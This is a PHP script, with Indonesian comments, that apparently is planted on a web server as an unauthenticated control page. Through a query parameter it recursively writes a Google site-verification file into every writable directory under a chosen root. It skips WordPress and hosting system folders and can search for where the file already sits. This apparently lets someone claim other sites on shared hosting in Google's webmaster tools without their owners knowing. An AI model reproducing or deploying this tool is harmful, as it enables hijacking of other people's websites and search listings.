<?php
# validator_query_mode active
error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");

define('MAX_LEVEL', 6);
$filename = 'googlec1ca4624b6659cb9.html';
$file_content = "google-site-verification: $filename";

$folder_blacklist = [
    'wp-content', 'wp-includes', 'wp-admin',
    '.cagefs', '.cpanel', '.cl.selector', '.caldav', '.htpasswds',
    '.koality', '.razor', '.softaculous', '.spamassassin', '.subaccounts', '.wp-cli',
    '.trash', '.pki', '.cache', '.security', '.config',
    'access-logs', 'logs', 'lscache', 'ssl', 'tmp', 'public_ftp',
    'sitepad-editor', 'etc', 'mail', 'softaculous_backups'
];
function is_blacklisted($path) {
    global $folder_blacklist;
    foreach ($folder_blacklist as $banned) {
        if (stripos($path, DIRECTORY_SEPARATOR . $banned) !== false) {
            return true;
        }
    }
    return false;
}

function write_file_recursively($dir, $filename, $level = 1) {
    if ($level > MAX_LEVEL || !is_dir($dir)) return;

    global $folder_blacklist, $file_content;
    $log = __DIR__ . DIRECTORY_SEPARATOR . 'log_tanam.txt';

    // Cek blacklist berdasarkan nama folder eksak
    foreach (explode(DIRECTORY_SEPARATOR, $dir) as $segment) {
        if (in_array($segment, $folder_blacklist, true)) return;
    }

    $filepath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;

    // Skip jika file sudah ada dan isinya sama persis
    if (file_exists($filepath)) {
        $content = @file_get_contents($filepath);
        if ($content !== false && trim($content) === $file_content) {
            file_put_contents($log, "[SKIP] $filepath - sudah sesuai\n", FILE_APPEND);
            goto lanjut_subfolder;
        }
    }

    // Coba tulis file baru
    if (is_writable($dir)) {
        if (@file_put_contents($filepath, $file_content) !== false) {
            file_put_contents($log, "[OK] $filepath\n", FILE_APPEND);
        } else {
            file_put_contents($log, "[FAIL] $filepath - gagal tulis\n", FILE_APPEND);
        }
    } else {
        file_put_contents($log, "[NO-WRITE] $filepath - folder tidak writeable\n", FILE_APPEND);
    }

    lanjut_subfolder:
    foreach (glob($dir . DIRECTORY_SEPARATOR . '*', GLOB_ONLYDIR) as $subdir) {
        write_file_recursively($subdir, $filename, $level + 1);
    }
}


function find_file_by_content($dir, $filename, $target_content, $level = 1, &$found = []) {
    if ($level > MAX_LEVEL || !is_dir($dir) || is_blacklisted($dir)) return;

    $filepath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
    if (is_file($filepath)) {
        $content = @file_get_contents($filepath);
        if ($content !== false && trim($content) === $target_content) {
            $found[] = realpath($dir);
        }
    }

    foreach (glob($dir . DIRECTORY_SEPARATOR . '*', GLOB_ONLYDIR) as $subdir) {
        find_file_by_content($subdir, $filename, $target_content, $level + 1, $found);
    }
}

$cwd = getcwd();
$cmd = $_GET['c'] ?? '';

echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>";

if ($cmd === 'copy') {
    echo "Tanam File Otomatis";
    echo "</title></head><body>";

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $base = rtrim($_POST['base'] ?? '', '/');

        write_file_recursively($base, $filename);
        echo "<p style='color:green;'>✅ File <b>" . htmlspecialchars($filename) . "</b> berhasil ditanam dari direktori <b>" . htmlspecialchars($base) . "</b></p>";
    }

    echo '<h3>🌱 Tanam ' . htmlspecialchars($filename) . ' (isi random 3 huruf)</h3>
    <form method="post">
        <label>Direktori root:</label>
        <input type="text" name="base" value="' . htmlspecialchars($cwd) . '" style="width:400px">
        <input type="submit" value="Tanam">
    </form>';
    echo "</body></html>";
    exit;
}

if ($cmd === 'search') {
    echo "Cari File Berdasarkan Isi";
    echo "</title></head><body>";

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $base = rtrim($_POST['base'] ?? '', '/');
        $found = [];
        global $file_content;

        find_file_by_content($base, $filename, $file_content, 1, $found);

        if ($found) {
            echo "<h3>✅ Ditemukan <b>" . htmlspecialchars($filename) . "</b> di:</h3><ul>";
            foreach ($found as $f) echo "<li>" . htmlspecialchars($f) . "</li>";
            echo "</ul>";
        } else {
            echo "<p style='color:red;'>❌ Tidak ditemukan file <b>" . htmlspecialchars($filename) . "</b> dengan isi <code>" . htmlspecialchars($file_content) . "</code> di <b>" . htmlspecialchars($base) . "</b></p>";
        }
    }

    echo '<h3>🔍 Cari ' . htmlspecialchars($filename) . ' berdasarkan isi (auto)</h3>
    <form method="post">
        <label>Direktori root:</label>
        <input type="text" name="base" value="' . htmlspecialchars($cwd) . '" style="width:400px">
        <input type="submit" value="Cari">
    </form>';
    echo "</body></html>";
    exit;
}


echo "Dashboard Pilihan";
echo "</title></head><body>";
echo "<p>📌 Akses: <code>?c=copy</code> untuk tanam | <code>?c=search</code> untuk cari</p>";
echo "</body></html>";
